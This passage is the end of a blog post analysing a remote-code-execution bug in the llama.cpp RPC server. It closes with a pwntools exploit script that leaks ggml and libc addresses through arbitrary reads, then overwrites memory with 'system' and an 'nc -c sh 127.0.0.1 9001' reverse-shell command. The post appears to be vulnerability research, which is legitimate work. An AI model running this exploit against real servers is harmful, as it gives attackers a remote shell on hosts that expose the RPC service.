class="string">&quot;127.0.0.1&quot;</span>, <span class="number">50052</span>)</span><br><span class="line">remote_ptr, remote_size = alloc_buffer(p, <span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># leak ggml base</span></span><br><span class="line">recv = arb_read(p, buffer_ptr, leak_addr, <span class="number">0x100</span>)</span><br><span class="line">leak_ggml_addr = u64(recv[<span class="number">0x10</span>:<span class="number">0x18</span>])</span><br><span class="line">ggml_base = leak_ggml_addr - ggml_so.symbols[<span class="string">&quot;ggml_backend_cpu_buffer_name&quot;</span>]</span><br><span class="line">ggml_puts_got = ggml_base + ggml_so.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.info(<span class="string">f&quot;leak_ggml_addr: <span class="subst">&#123;<span class="built_in">hex</span>(leak_ggml_addr)&#125;</span>, ggml_puts_got: <span class="subst">&#123;<span class="built_in">hex</span>(ggml_puts_got)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">recv = arb_read(p, buffer_ptr, ggml_puts_got, <span class="number">0x100</span>)</span><br><span class="line">libc_puts_addr = u64(recv[:<span class="number">0x8</span>])</span><br><span class="line">libc_base = libc_puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.info(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># hijack</span></span><br><span class="line">cmd = flat([</span><br><span class="line">    <span class="string">b&quot;nc -c sh 127.0.0.1 9001&quot;</span>.ljust(<span class="number">0x37</span>, <span class="string">b&quot; &quot;</span>) + <span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">    libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">])</span><br><span class="line">arb_write(p, buffer_ptr, buffer_ptr, cmd)</span><br><span class="line">clear_buffer(p, remote_ptr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ipdb.set_trace()</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/57522d58feaca004bcd1723d62a4adec.png"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a target="_blank" rel="noopener" href="https://pwner.gg/blog/2024-10-03-llama-cpp-cves">Pwning LLaMA.cpp RPC Server</a></li>
</ul>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Sp1k3</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://the-soloist.github.io/2025/09/15/llama-cpp-tensor-rce1/">https://the-soloist.github.io/2025/09/15/llama-cpp-tensor-rce1/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright © 2023-2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="../../../../tag/LLM/"># LLM</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="../llama-cpp-tensor-rce2/">llama.cpp版本小于b4657时COPY_TENSOR越界写漏洞导致的RCE分析</a>
            
            
            <a class="next" rel="next" href="../../../../1901/01/01/hello-world/">Hello World</a>
            
        </section>

        <br><!-- 空行，美化排版 --></br>

        

        
        <section id="comments2" class="comments">
            <script
  src="https://giscus.app/client.js"
  data-repo="the-soloist/the-soloist.github.io"
  data-repo-id="R_kgDOL50f9A"
  data-category="Announcements"
  data-category-id="DIC_kwDOL50f9M4CfRb1"
  data-mapping="pathname"
  data-strict="0"
  data-reactions-enabled="1"
  data-emit-metadata="1"
  data-input-position="bottom"
  data-theme="light"
  data-lang="zh-CN"
  crossorigin="anonymous"
  async
></script>

        </section>
        

    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Sp1k3 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>